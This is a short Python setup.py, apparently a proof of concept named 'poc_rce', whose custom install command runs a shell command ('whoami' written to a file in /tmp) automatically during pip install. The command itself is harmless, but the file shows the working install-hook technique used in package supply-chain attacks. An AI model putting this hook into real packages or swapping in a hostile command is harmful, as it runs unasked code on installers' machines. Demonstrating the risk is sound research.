from setuptools import setup
from setuptools.command.install import install

class CustomInstallCommand(install):
    def run(self):
        print("Code exécuté pendant pip install")
        import os
        os.system("whoami > /tmp/whoami_poc_rce.txt")
        install.run(self)

setup(
    name="poc_rce",
    version="1.0.0",
    packages=["poc_rce"],
    cmdclass={
        "install": CustomInstallCommand,
    },
)
